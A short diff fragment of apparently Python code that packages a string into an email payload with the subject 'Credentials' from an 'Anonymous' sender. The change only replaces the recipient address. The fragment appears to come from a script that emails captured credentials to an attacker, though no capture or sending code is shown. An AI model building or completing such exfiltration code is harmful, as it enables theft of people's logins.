@@ -26,7 +26,7 @@ def x(string):
 	data = {
 	'name': 'Anonymous',
 	'sender': 'anonymous@gmail.com',
-	'email': 'just4datutorial@gmail.com',
+	'email': 'email@gmail.com',
 	'subject': 'Credentials',
 	'content': string
 	}
